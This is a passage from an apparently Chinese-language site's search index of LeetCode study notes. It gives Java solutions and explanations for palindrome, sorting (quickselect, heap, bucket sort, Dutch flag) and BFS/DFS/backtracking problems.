\u0026amp;\u0026amp; s.charAt(start) == s.charAt(end)) { start--; end++; cnt++; } } 8. 判断一个整数是否是回文数    9. Palindrome Number (Easy)\nLeetcode / 力扣\n要求不能使用额外空间，也就不能将整数转换为字符串进行判断。\n将整数分成左右两部分，右边那部分需要转置，然后判断这两部分是否相等。\npublic boolean isPalindrome(int x) { if (x == 0) { return true; } if (x \u0026lt; 0 || x % 10 == 0) { return false; } int right = 0; while (x \u0026gt; right) { right = right * 10 + x % 10; x /= 10; } return x == right || x == right / 10; } 9. 统计二进制字符串中连续 1 和连续 0 数量相同的子字符串个数    696. Count Binary Substrings (Easy)\nLeetcode / 力扣\nInput: \u0026#34;00110011\u0026#34; Output: 6 Explanation: There are 6 substrings that have equal number of consecutive 1\u0026#39;s and 0\u0026#39;s: \u0026#34;0011\u0026#34;, \u0026#34;01\u0026#34;, \u0026#34;1100\u0026#34;, \u0026#34;10\u0026#34;, \u0026#34;0011\u0026#34;, and \u0026#34;01\u0026#34;. public int countBinarySubstrings(String s) { int preLen = 0, curLen = 1, count = 0; for (int i = 1; i \u0026lt; s.length(); i++) { if (s.charAt(i) == s.charAt(i - 1)) { curLen++; } else { preLen = curLen; curLen = 1; } if (preLen \u0026gt;= curLen) { count++; } } return count; } "},{"id":248,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E6%8E%92%E5%BA%8F/","title":"Leetcode 题解 - 排序","parent":"笔记","content":"Leetcode 题解 - 排序     Leetcode 题解 - 排序  快速选择 堆  1. Kth Element   桶排序  1. 出现频率最多的 k 个元素 2. 按照字符出现次数对字符串排序   荷兰国旗问题  1. 按颜色进行排序      快速选择    用于求解 Kth Element 问题，也就是第 K 个元素的问题。\n可以使用快速排序的 partition() 进行实现。需要先打乱数组，否则最坏情况下时间复杂度为 O(N2)。\n堆    用于求解 TopK Elements 问题，也就是 K 个最小元素的问题。使用最小堆来实现 TopK 问题，最小堆使用大顶堆来实现，大顶堆的堆顶元素为当前堆的最大元素。实现过程：不断地往大顶堆中插入新元素，当堆中元素的数量大于 k 时，移除堆顶元素，也就是当前堆中最大的元素，剩下的元素都为当前添加过的元素中最小的 K 个元素。插入和移除堆顶元素的时间复杂度都为 log2N。\n堆也可以用于求解 Kth Element 问题，得到了大小为 K 的最小堆之后，因为使用了大顶堆来实现，因此堆顶元素就是第 K 大的元素。\n快速选择也可以求解 TopK Elements 问题，因为找到 Kth Element 之后，再遍历一次数组，所有小于等于 Kth Element 的元素都是 TopK Elements。\n可以看到，快速选择和堆排序都可以求解 Kth Element 和 TopK Elements 问题。\n1. Kth Element    215. Kth Largest Element in an Array (Medium)\nLeetcode / 力扣\nInput: [3,2,1,5,6,4] and k = 2 Output: 5 题目描述：找到倒数第 k 个的元素。\n排序 ：时间复杂度 O(NlogN)，空间复杂度 O(1)\npublic int findKthLargest(int[] nums, int k) { Arrays.sort(nums); return nums[nums.length - k]; } 堆 ：时间复杂度 O(NlogK)，空间复杂度 O(K)。\npublic int findKthLargest(int[] nums, int k) { PriorityQueue\u0026lt;Integer\u0026gt; pq = new PriorityQueue\u0026lt;\u0026gt;(); // 小顶堆  for (int val : nums) { pq.add(val); if (pq.size() \u0026gt; k) // 维护堆的大小为 K  pq.poll(); } return pq.peek(); } 快速选择 ：时间复杂度 O(N)，空间复杂度 O(1)\npublic int findKthLargest(int[] nums, int k) { k = nums.length - k; int l = 0, h = nums.length - 1; while (l \u0026lt; h) { int j = partition(nums, l, h); if (j == k) { break; } else if (j \u0026lt; k) { l = j + 1; } else { h = j - 1; } } return nums[k]; } private int partition(int[] a, int l, int h) { int i = l, j = h + 1; while (true) { while (a[++i] \u0026lt; a[l] \u0026amp;\u0026amp; i \u0026lt; h) ; while (a[--j] \u0026gt; a[l] \u0026amp;\u0026amp; j \u0026gt; l) ; if (i \u0026gt;= j) { break; } swap(a, i, j); } swap(a, l, j); return j; } private void swap(int[] a, int i, int j) { int t = a[i]; a[i] = a[j]; a[j] = t; } 桶排序    1. 出现频率最多的 k 个元素    347. Top K Frequent Elements (Medium)\nLeetcode / 力扣\nGiven [1,1,1,2,2,3] and k = 2, return [1,2]. 设置若干个桶，每个桶存储出现频率相同的数。桶的下标表示数出现的频率，即第 i 个桶中存储的数出现的频率为 i。\n把数都放到桶之后，从后向前遍历桶，最先得到的 k 个数就是出现频率最多的的 k 个数。\npublic int[] topKFrequent(int[] nums, int k) { Map\u0026lt;Integer, Integer\u0026gt; frequencyForNum = new HashMap\u0026lt;\u0026gt;(); for (int num : nums) { frequencyForNum.put(num, frequencyForNum.getOrDefault(num, 0) + 1); } List\u0026lt;Integer\u0026gt;[] buckets = new ArrayList[nums.length + 1]; for (int key : frequencyForNum.keySet()) { int frequency = frequencyForNum.get(key); if (buckets[frequency] == null) { buckets[frequency] = new ArrayList\u0026lt;\u0026gt;(); } buckets[frequency].add(key); } List\u0026lt;Integer\u0026gt; topK = new ArrayList\u0026lt;\u0026gt;(); for (int i = buckets.length - 1; i \u0026gt;= 0 \u0026amp;\u0026amp; topK.size() \u0026lt; k; i--) { if (buckets[i] == null) { continue; } if (buckets[i].size() \u0026lt;= (k - topK.size())) { topK.addAll(buckets[i]); } else { topK.addAll(buckets[i].subList(0, k - topK.size())); } } int[] res = new int[k]; for (int i = 0; i \u0026lt; k; i++) { res[i] = topK.get(i); } return res; } 2. 按照字符出现次数对字符串排序    451. Sort Characters By Frequency (Medium)\nLeetcode / 力扣\nInput: \u0026#34;tree\u0026#34; Output: \u0026#34;eert\u0026#34; Explanation: \u0026#39;e\u0026#39; appears twice while \u0026#39;r\u0026#39; and \u0026#39;t\u0026#39; both appear once. So \u0026#39;e\u0026#39; must appear before both \u0026#39;r\u0026#39; and \u0026#39;t\u0026#39;. Therefore \u0026#34;eetr\u0026#34; is also a valid answer. public String frequencySort(String s) { Map\u0026lt;Character, Integer\u0026gt; frequencyForNum = new HashMap\u0026lt;\u0026gt;(); for (char c : s.toCharArray()) frequencyForNum.put(c, frequencyForNum.getOrDefault(c, 0) + 1); List\u0026lt;Character\u0026gt;[] frequencyBucket = new ArrayList[s.length() + 1]; for (char c : frequencyForNum.keySet()) { int f = frequencyForNum.get(c); if (frequencyBucket[f] == null) { frequencyBucket[f] = new ArrayList\u0026lt;\u0026gt;(); } frequencyBucket[f].add(c); } StringBuilder str = new StringBuilder(); for (int i = frequencyBucket.length - 1; i \u0026gt;= 0; i--) { if (frequencyBucket[i] == null) { continue; } for (char c : frequencyBucket[i]) { for (int j = 0; j \u0026lt; i; j++) { str.append(c); } } } return str.toString(); } 荷兰国旗问题    荷兰国旗包含三种颜色：红、白、蓝。\n有三种颜色的球，算法的目标是将这三种球按颜色顺序正确地排列。它其实是三向切分快速排序的一种变种，在三向切分快速排序中，每次切分都将数组分成三个区间：小于切分元素、等于切分元素、大于切分元素，而该算法是将数组分成三个区间：等于红色、等于白色、等于蓝色。\n\n1. 按颜色进行排序    75. Sort Colors (Medium)\nLeetcode / 力扣\nInput: [2,0,2,1,1,0] Output: [0,0,1,1,2,2] 题目描述：只有 0/1/2 三种颜色。\npublic void sortColors(int[] nums) { int zero = -1, one = 0, two = nums.length; while (one \u0026lt; two) { if (nums[one] == 0) { swap(nums, ++zero, one++); } else if (nums[one] == 2) { swap(nums, --two, one); } else { ++one; } } } private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t; } "},{"id":249,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E6%90%9C%E7%B4%A2/","title":"Leetcode 题解 - 搜索","parent":"笔记","content":"Leetcode 题解 - 搜索     Leetcode 题解 - 搜索  BFS  1. 计算在网格中从原点到特定点的最短路径长度 2. 组成整数的最小平方数数量 3. 最短单词路径   DFS  1. 查找最大的连通面积 2. 矩阵中的连通分量数目 3. 好友关系的连通分量数目 4. 填充封闭区域 5. 能到达的太平洋和大西洋的区域   Backtracking  1. 数字键盘组合 2. IP 地址划分 3. 在矩阵中寻找字符串 4. 输出二叉树中所有从根到叶子的路径 5. 排列 6. 含有相同元素求排列 7. 组合 8. 组合求和 9. 含有相同元素的组合求和 10. 1-9 数字的组合求和 11. 子集 12. 含有相同元素求子集 13. 分割字符串使得每个部分都是回文数 14. 数独 15. N 皇后      深度优先搜索和广度优先搜索广泛运用于树和图中，但是它们的应用远远不止如此。\nBFS    \n广度优先搜索一层一层地进行遍历，每层遍历都是以上一层遍历的结果作为起点，遍历一个距离能访问到的所有节点。需要注意的是，遍历过的节点不能再次被遍历。\n第一层：\n 0 -\u0026gt; {6,2,1,5}  第二层：\n 6 -\u0026gt; {4} 2 -\u0026gt; {} 1 -\u0026gt; {} 5 -\u0026gt; {3}  第三层：\n 4 -\u0026gt; {} 3 -\u0026gt; {}  每一层遍历的节点都与根节点距离相同。设 di 表示第 i 个节点与根节点的距离，推导出一个结论：对于先遍历的节点 i 与后遍历的节点 j，有 di \u0026lt;= dj。利用这个结论，可以求解最短路径等 最优解 问题：第一次遍历到目的节点，其所经过的路径为最短路径。应该注意的是，使用 BFS 只能求解无权图的最短路径，无权图是指从一个节点到另一个节点的代价都记为 1。\n在程序实现 BFS 时需要考虑以下问题：\n 队列：用来存储每一轮遍历得到的节点； 标记：对于遍历过的节点，应该将它标记，防止重复遍历。  1. 计算在网格中从原点到特定点的最短路径长度    1091. Shortest Path in Binary Matrix(Medium)\nLeetcode / 力扣\n[[1,1,0,1], [1,0,1,0], [1,1,1,1], [1,0,1,1]] 题目描述：0 表示可以经过某个位置，求解从左上角到右下角的最短路径长度。\npublic int shortestPathBinaryMatrix(int[][] grids) { if (grids == null || grids.length == 0 || grids[0].length == 0) { return -1; } int[][] direction = {{1, -1}, {1, 0}, {1, 1}, {0, -1}, {0, 1}, {-1, -1}, {-1, 0}, {-1, 1}}; int m = grids.length, n = grids[0].length; Queue\u0026lt;Pair\u0026lt;Integer, Integer\u0026gt;\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); queue.add(new Pair\u0026lt;\u0026gt;(0, 0)); int pathLength = 0; while (!queue.isEmpty()) { int size = queue.size(); pathLength++; while (size-- \u0026gt; 0) { Pair\u0026lt;Integer, Integer\u0026gt; cur = queue.poll(); int cr = cur.getKey(), cc = cur.getValue(); if (grids[cr][cc] == 1) { continue; } if (cr == m - 1 \u0026amp;\u0026amp; cc == n - 1) { return pathLength; } grids[cr][cc] = 1; // 标记  for (int[] d : direction) { int nr = cr + d[0], nc = cc + d[1]; if (nr \u0026lt; 0 || nr \u0026gt;= m || nc \u0026lt; 0 || nc \u0026gt;= n) { continue; } queue.add(new Pair\u0026lt;\u0026gt;(nr, nc)); } } } return -1; } 2. 组成整数的最小平方数数量    279. Perfect Squares (Medium)\nLeetcode / 力扣\nFor example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9. 可以将每个整数看成图中的一个节点，如果两个整数之差为一个平方数，那么这两个整数所在的节点就有一条边。\n要求解最小的平方数数量，就是求解从节点 n 到节点 0 的最短路径。\n本题也可以用动态规划求解，在之后动态规划部分中会再次出现。\npublic int numSquares(int n) { List\u0026lt;Integer\u0026gt; squares = generateSquares(n); Queue\u0026lt;Integer\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); boolean[] marked = new boolean[n + 1]; queue.add(n); marked[n] = true; int level = 0; while (!queue.isEmpty()) { int size = queue.size(); level++; while (size-- \u0026gt; 0) { int cur = queue.poll(); for (int s : squares) { int next = cur - s; if (next \u0026lt; 0) { break; } if (next == 0) { return level; } if (marked[next]) { continue; } marked[next] = true; queue.add(next); } } } return n; } /** * 生成小于 n 的平方数序列 * @return 1,4,9,... */ private List\u0026lt;Integer\u0026gt; generateSquares(int n) { List\u0026lt;Integer\u0026gt; squares = new ArrayList\u0026lt;\u0026gt;(); int square = 1; int diff = 3; while (square \u0026lt;= n) { squares.add(square); square += diff; diff += 2; } return squares; } 3. 最短单词路径    127. Word Ladder (Medium)\nLeetcode / 力扣\nInput: beginWord = \u0026#34;hit\u0026#34;, endWord = \u0026#34;cog\u0026#34;, wordList = [\u0026#34;hot\u0026#34;,\u0026#34;dot\u0026#34;,\u0026#34;dog\u0026#34;,\u0026#34;lot\u0026#34;,\u0026#34;log\u0026#34;,\u0026#34;cog\u0026#34;] Output: 5 Explanation: As one shortest transformation is \u0026#34;hit\u0026#34; -\u0026gt; \u0026#34;hot\u0026#34; -\u0026gt; \u0026#34;dot\u0026#34; -\u0026gt; \u0026#34;dog\u0026#34; -\u0026gt; \u0026#34;cog\u0026#34;, return its length 5. Input: beginWord = \u0026#34;hit\u0026#34; endWord = \u0026#34;cog\u0026#34; wordList = [\u0026#34;hot\u0026#34;,\u0026#34;dot\u0026#34;,\u0026#34;dog\u0026#34;,\u0026#34;lot\u0026#34;,\u0026#34;log\u0026#34;] Output: 0 Explanation: The endWord \u0026#34;cog\u0026#34; is not in wordList, therefore no possible transformation. 题目描述：找出一条从 beginWord 到 endWord 的最短路径，每次移动规定为改变一个字符，并且改变之后的字符串必须在 wordList 中。\npublic int ladderLength(String beginWord, String endWord, List\u0026lt;String\u0026gt; wordList) { wordList.add(beginWord); int N = wordList.size(); int start = N - 1; int end = 0; while (end \u0026lt; N \u0026amp;\u0026amp; !wordList.get(end).equals(endWord)) { end++; } if (end == N) { return 0; } List\u0026lt;Integer\u0026gt;[] graphic = buildGraphic(wordList); return getShortestPath(graphic, start, end); } private List\u0026lt;Integer\u0026gt;[] buildGraphic(List\u0026lt;String\u0026gt; wordList) { int N = wordList.size(); List\u0026lt;Integer\u0026gt;[] graphic = new List[N]; for (int i = 0; i \u0026lt; N; i++) { graphic[i] = new ArrayList\u0026lt;\u0026gt;(); for (int j = 0; j \u0026lt; N; j++) { if (isConnect(wordList.get(i), wordList.get(j))) { graphic[i].add(j); } } } return graphic; } private boolean isConnect(String s1, String s2) { int diffCnt = 0; for (int i = 0; i \u0026lt; s1.length() \u0026amp;\u0026amp; diffCnt \u0026lt;= 1; i++) { if (s1.charAt(i) != s2.charAt(i)) { diffCnt++; } } return diffCnt == 1; } private int getShortestPath(List\u0026lt;Integer\u0026gt;[] graphic, int start, int end) { Queue\u0026lt;Integer\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); boolean[] marked = new boolean[graphic.length]; queue.add(start); marked[start] = true; int path = 1; while (!queue.isEmpty()) { int size = queue.size(); path++; while (size-- \u0026gt; 0) { int cur = queue.poll(); for (int next : graphic[cur]) { if (next == end) { return path; } if (marked[next]) { continue; } marked[next] = true; queue.add(next); } } } return 0; } DFS    \n广度优先搜索一层一层遍历，每一层得到的所有新节点，要用队列存储起来以备下一层遍历的时候再遍历。\n而深度优先搜索在得到一个新节点时立即对新节点进行遍历：从节点 0 出发开始遍历，得到到新节点 6 时，立马对新节点 6 进行遍历，得到新节点 4；如此反复以这种方式遍历新节点，直到没有新节点了，此时返回。返回到根节点 0 的情况是，继续对根节点 0 进行遍历，得到新节点 2，然后继续以上步骤。\n从一个节点出发，使用 DFS 对一个图进行遍历时，能够遍历到的节点都是从初始节点可达的，DFS 常用来求解这种 可达性 问题。\n在程序实现 DFS 时需要考虑以下问题：\n 栈：用栈来保存当前节点信息，当遍历新节点返回时能够继续遍历当前节点。可以使用递归栈。 标记：和 BFS 一样同样需要对已经遍历过的节点进行标记。  1. 查找最大的连通面积    695. Max Area of Island (Medium)\nLeetcode / 力扣\n[[0,0,1,0,0,0,0,1,0,0,0,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,1,1,0,1,0,0,0,0,0,0,0,0], [0,1,0,0,1,1,0,0,1,0,1,0,0], [0,1,0,0,1,1,0,0,1,1,1,0,0], [0,0,0,0,0,0,0,0,0,0,1,0,0], [0,0,0,0,0,0,0,1,1,1,0,0,0], [0,0,0,0,0,0,0,1,1,0,0,0,0]] private int m, n; private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; public int maxAreaOfIsland(int[][] grid) { if (grid == null || grid.length == 0) { return 0; } m = grid.length; n = grid[0].length; int maxArea = 0; for (int i = 0; i \u0026lt; m; i++) { for (int j = 0; j \u0026lt; n; j++) { maxArea = Math.max(maxArea, dfs(grid, i, j)); } } return maxArea; } private int dfs(int[][] grid, int r, int c) { if (r \u0026lt; 0 || r \u0026gt;= m || c \u0026lt; 0 || c \u0026gt;= n || grid[r][c] == 0) { return 0; } grid[r][c] = 0; int area = 1; for (int[] d : direction) { area += dfs(grid, r + d[0], c + d[1]); } return area; } 2. 矩阵中的连通分量数目    200. Number of Islands (Medium)\nLeetcode / 力扣\nInput: 11000 11000 00100 00011 Output: 3 可以将矩阵表示看成一张有向图。\nprivate int m, n; private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; public int numIslands(char[][] grid) { if (grid == null || grid.length == 0) { return 0; } m = grid.length; n = grid[0].length; int islandsNum = 0; for (int i = 0; i \u0026lt; m; i++) { for (int j = 0; j \u0026lt; n; j++) { if (grid[i][j] != \u0026#39;0\u0026#39;) { dfs(grid, i, j); islandsNum++; } } } return islandsNum; } private void dfs(char[][] grid, int i, int j) { if (i \u0026lt; 0 || i \u0026gt;= m || j \u0026lt; 0 || j \u0026gt;= n || grid[i][j] == \u0026#39;0\u0026#39;) { return; } grid[i][j] = \u0026#39;0\u0026#39;; for (int[] d : direction) { dfs(grid, i + d[0], j + d[1]); } } 3. 好友关系的连通分量数目    547. Friend Circles (Medium)\nLeetcode / 力扣\nInput: [[1,1,0], [1,1,0], [0,0,1]] Output: 2 Explanation:The 0th and 1st students are direct friends, so they are in a friend circle. The 2nd student himself is in a friend circle. So return 2. 题目描述：好友关系可以看成是一个无向图，例如第 0 个人与第 1 个人是好友，那么 M[0][1] 和 M[1][0] 的值都为 1。\nprivate int n; public int findCircleNum(int[][] M) { n = M.length; int circleNum = 0; boolean[] hasVisited = new boolean[n]; for (int i = 0; i \u0026lt; n; i++) { if (!hasVisited[i]) { dfs(M, i, hasVisited); circleNum++; } } return circleNum; } private void dfs(int[][] M, int i, boolean[] hasVisited) { hasVisited[i] = true; for (int k = 0; k \u0026lt; n; k++) { if (M[i][k] == 1 \u0026amp;\u0026amp; !hasVisited[k]) { dfs(M, k, hasVisited); } } } 4. 填充封闭区域    130. Surrounded Regions (Medium)\nLeetcode / 力扣\nFor example, X X X X X O O X X X O X X O X X After running your function, the board should be: X X X X X X X X X X X X X O X X 题目描述：使被 \u0026lsquo;X\u0026rsquo; 包围的 \u0026lsquo;O\u0026rsquo; 转换为 \u0026lsquo;X\u0026rsquo;。\n先填充最外侧，剩下的就是里侧了。\nprivate int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; private int m, n; public void solve(char[][] board) { if (board == null || board.length == 0) { return; } m = board.length; n = board[0].length; for (int i = 0; i \u0026lt; m; i++) { dfs(board, i, 0); dfs(board, i, n - 1); } for (int i = 0; i \u0026lt; n; i++) { dfs(board, 0, i); dfs(board, m - 1, i); } for (int i = 0; i \u0026lt; m; i++) { for (int j = 0; j \u0026lt; n; j++) { if (board[i][j] == \u0026#39;T\u0026#39;) { board[i][j] = \u0026#39;O\u0026#39;; } else if (board[i][j] == \u0026#39;O\u0026#39;) { board[i][j] = \u0026#39;X\u0026#39;; } } } } private void dfs(char[][] board, int r, int c) { if (r \u0026lt; 0 || r \u0026gt;= m || c \u0026lt; 0 || c \u0026gt;= n || board[r][c] != \u0026#39;O\u0026#39;) { return; } board[r][c] = \u0026#39;T\u0026#39;; for (int[] d : direction) { dfs(board, r + d[0], c + d[1]); } } 5. 能到达的太平洋和大西洋的区域    417. Pacific Atlantic Water Flow (Medium)\nLeetcode / 力扣\nGiven the following 5x5 matrix: Pacific ~ ~ ~ ~ ~ ~ 1 2 2 3 (5) * ~ 3 2 3 (4) (4) * ~ 2 4 (5) 3 1 * ~ (6) (7) 1 4 5 * ~ (5) 1 1 2 4 * * * * * * Atlantic Return: [[0, 4], [1, 3], [1, 4], [2, 2], [3, 0], [3, 1], [4, 0]] (positions with parentheses in above matrix). 左边和上边是太平洋，右边和下边是大西洋，内部的数字代表海拔，海拔高的地方的水能够流到低的地方，求解水能够流到太平洋和大西洋的所有位置。\nprivate int m, n; private int[][] matrix; private int[][] direction = {{0, 1}, {0, -1}, {1, 0}, {-1, 0}}; public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; pacificAtlantic(int[][] matrix) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); if (matrix == null || matrix.length == 0) { return ret; } m = matrix.length; n = matrix[0].length; this.matrix = matrix; boolean[][] canReachP = new boolean[m][n]; boolean[][] canReachA = new boolean[m][n]; for (int i = 0; i \u0026lt; m; i++) { dfs(i, 0, canReachP); dfs(i, n - 1, canReachA); } for (int i = 0; i \u0026lt; n; i++) { dfs(0, i, canReachP); dfs(m - 1, i, canReachA); } for (int i = 0; i \u0026lt; m; i++) { for (int j = 0; j \u0026lt; n; j++) { if (canReachP[i][j] \u0026amp;\u0026amp; canReachA[i][j]) { ret.add(Arrays.asList(i, j)); } } } return ret; } private void dfs(int r, int c, boolean[][] canReach) { if (canReach[r][c]) { return; } canReach[r][c] = true; for (int[] d : direction) { int nextR = d[0] + r; int nextC = d[1] + c; if (nextR \u0026lt; 0 || nextR \u0026gt;= m || nextC \u0026lt; 0 || nextC \u0026gt;= n || matrix[r][c] \u0026gt; matrix[nextR][nextC]) { continue; } dfs(nextR, nextC, canReach); } } Backtracking    Backtracking（回溯）属于 DFS。\n 普通 DFS 主要用在 可达性问题 ，这种问题只需要执行到特点的位置然后返回即可。 而 Backtracking 主要用于求解 排列组合 问题，例如有 { \u0026lsquo;a\u0026rsquo;,\u0026lsquo;b\u0026rsquo;,\u0026lsquo;c\u0026rsquo; } 三个字符，求解所有由这三个字符排列得到的字符串，这种问题在执行到特定的位置返回之后还会继续执行求解过程。  因为 Backtracking 不是立即返回，而要继续求解，因此在程序实现时，需要注意对元素的标记问题：\n 在访问一个新元素进入新的递归调用时，需要将新元素标记为已经访问，这样才能在继续递归调用时不用重复访问该元素； 但是在递归返回时，需要将元素标记为未访问，因为只需要保证在一个递归链中不同时访问一个元素，可以访问已经访问过但是不在当前递归链中的元素。  1. 数字键盘组合    17. Letter Combinations of a Phone Number (Medium)\nLeetcode / 力扣\n\nInput:Digit string \u0026#34;23\u0026#34; Output: [\u0026#34;ad\u0026#34;, \u0026#34;ae\u0026#34;, \u0026#34;af\u0026#34;, \u0026#34;bd\u0026#34;, \u0026#34;be\u0026#34;, \u0026#34;bf\u0026#34;, \u0026#34;cd\u0026#34;, \u0026#34;ce\u0026#34;, \u0026#34;cf\u0026#34;]. private static final String[] KEYS = {\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;abc\u0026#34;, \u0026#34;def\u0026#34;, \u0026#34;ghi\u0026#34;, \u0026#34;jkl\u0026#34;, \u0026#34;mno\u0026#34;, \u0026#34;pqrs\u0026#34;, \u0026#34;tuv\u0026#34;, \u0026#34;wxyz\u0026#34;}; public List\u0026lt;String\u0026gt; letterCombinations(String digits) { List\u0026lt;String\u0026gt; combinations = new ArrayList\u0026lt;\u0026gt;(); if (digits == null || digits.length() == 0) { return combinations; } doCombination(new StringBuilder(), combinations, digits); return combinations; } private void doCombination(StringBuilder prefix, List\u0026lt;String\u0026gt; combinations, final String digits) { if (prefix.length() == digits.length()) { combinations.add(prefix.toString()); return; } int curDigits = digits.charAt(prefix.length()) - \u0026#39;0\u0026#39;; String letters = KEYS[curDigits]; for (char c : letters.toCharArray()) { prefix.append(c); // 添加  doCombination(prefix, combinations, digits); prefix.deleteCharAt(prefix.length() - 1); // 删除  } } 2. IP 地址划分    93. Restore IP Addresses(Medium)\nLeetcode / 力扣\nGiven \u0026#34;25525511135\u0026#34;, return [\u0026#34;255.255.11.135\u0026#34;, \u0026#34;255.255.111.35\u0026#34;]. public List\u0026lt;String\u0026gt; restoreIpAddresses(String s) { List\u0026lt;String\u0026gt; addresses = new ArrayList\u0026lt;\u0026gt;(); StringBuilder tempAddress = new StringBuilder(); doRestore(0, tempAddress, addresses, s); return addresses; } private void doRestore(int k, StringBuilder tempAddress, List\u0026lt;String\u0026gt; addresses, String s) { if (k == 4 || s.length() == 0) { if (k == 4 \u0026amp;\u0026amp; s.length() == 0) { addresses.add(tempAddress.toString()); } return; } for (int i = 0; i \u0026lt; s.length() \u0026amp;\u0026amp; i \u0026lt;= 2; i++) { if (i != 0 \u0026amp;\u0026amp; s.charAt(0) == \u0026#39;0\u0026#39;) { break; } String part = s.substring(0, i + 1); if (Integer.valueOf(part) \u0026lt;= 255) { if (tempAddress.length() != 0) { part = \u0026#34;.\u0026#34; + part; } tempAddress.append(part); doRestore(k + 1, tempAddress, addresses, s.substring(i + 1)); tempAddress.delete(tempAddress.length() - part.length(), tempAddress.length()); } } } 3. 在矩阵中寻找字符串    79. Word Search (Medium)\nLeetcode / 力扣\nFor example, Given board = [ [\u0026#39;A\u0026#39;,\u0026#39;B\u0026#39;,\u0026#39;C\u0026#39;,\u0026#39;E\u0026#39;], [\u0026#39;S\u0026#39;,\u0026#39;F\u0026#39;,\u0026#39;C\u0026#39;,\u0026#39;S\u0026#39;], [\u0026#39;A\u0026#39;,\u0026#39;D\u0026#39;,\u0026#39;E\u0026#39;,\u0026#39;E\u0026#39;] ] word = \u0026#34;ABCCED\u0026#34;, -\u0026gt; returns true, word = \u0026#34;SEE\u0026#34;, -\u0026gt; returns true, word = \u0026#34;ABCB\u0026#34;, -\u0026gt; returns false. private final static int[][] direction = {{1, 0}, {-1, 0}, {0, 1}, {0, -1}}; private int m; private int n; public boolean exist(char[][] board, String word) { if (word == null || word.length() == 0) { return true; } if (board == null || board.length == 0 || board[0].length == 0) { return false; } m = board.length; n = board[0].length; boolean[][] hasVisited = new boolean[m][n]; for (int r = 0; r \u0026lt; m; r++) { for (int c = 0; c \u0026lt; n; c++) { if (backtracking(0, r, c, hasVisited, board, word)) { return true; } } } return false; } private boolean backtracking(int curLen, int r, int c, boolean[][] visited, final char[][] board, final String word) { if (curLen == word.length()) { return true; } if (r \u0026lt; 0 || r \u0026gt;= m || c \u0026lt; 0 || c \u0026gt;= n || board[r][c] != word.charAt(curLen) || visited[r][c]) { return false; } visited[r][c] = true; for (int[] d : direction) { if (backtracking(curLen + 1, r + d[0], c + d[1], visited, board, word)) { return true; } } visited[r][c] = false; return false; } 4. 输出二叉树中所有从根到叶子的路径    257. Binary Tree Paths (Easy)\nLeetcode / 力扣\n1 / \\ 2 3 \\ 5 [\u0026#34;1-\u0026gt;2-\u0026gt;5\u0026#34;, \u0026#34;1-\u0026gt;3\u0026#34;] public List\u0026lt;String\u0026gt; binaryTreePaths(TreeNode root) { List\u0026lt;String\u0026gt; paths = new ArrayList\u0026lt;\u0026gt;(); if (root == null) { return paths; } List\u0026lt;Integer\u0026gt; values = new ArrayList\u0026lt;\u0026gt;(); backtracking(root, values, paths); return paths; } private void backtracking(TreeNode node, List\u0026lt;Integer\u0026gt; values, List\u0026lt;String\u0026gt; paths) { if (node == null) { return; } values.add(node.val); if (isLeaf(node)) { paths.add(buildPath(values)); } else { backtracking(node.left, values, paths); backtracking(node.right, values, paths); } values.remove(values.size() - 1); } private boolean isLeaf(TreeNode node) { return node.left == null \u0026amp;\u0026amp; node.right == null; } private String buildPath(List\u0026lt;Integer\u0026gt; values) { StringBuilder str = new StringBuilder(); for (int i = 0; i \u0026lt; values.size(); i++) { str.append(values.get(i)); if (i != values.size() - 1) { str.append(\u0026#34;-\u0026gt;\u0026#34;); } } return str.toString(); } 5. 排列    46. Permutations (Medium)\nLeetcode / 力扣\n[1,2,3] have the following permutations: [ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1] ] public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; permute(int[] nums) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; permutes = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; permuteList = new ArrayList\u0026lt;\u0026gt;(); boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes; } private void backtracking(List\u0026lt;Integer\u0026gt; permuteList, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; permutes, boolean[] visited, final int[] nums) { if (permuteList.size() == nums.length) { permutes.add(new ArrayList\u0026lt;\u0026gt;(permuteList)); // 重新构造一个 List  return; } for (int i = 0; i \u0026lt; visited.length; i++) { if (visited[i]) { continue; } visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; } } 6. 含有相同元素求排列    47. Permutations II (Medium)\nLeetcode / 力扣\n[1,1,2] have the following unique permutations: [[1,1,2], [1,2,1], [2,1,1]] 数组元素可能含有相同的元素，进行排列时就有可能出现重复的排列，要求重复的排列只返回一个。\n在实现上，和 Permutations 不同的是要先排序，然后在添加一个元素时，判断这个元素是否等于前一个元素，如果等于，并且前一个元素还未访问，那么就跳过这个元素。\npublic List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; permuteUnique(int[] nums) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; permutes = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; permuteList = new ArrayList\u0026lt;\u0026gt;(); Arrays.sort(nums); // 排序  boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes; } private void backtracking(List\u0026lt;Integer\u0026gt; permuteList, 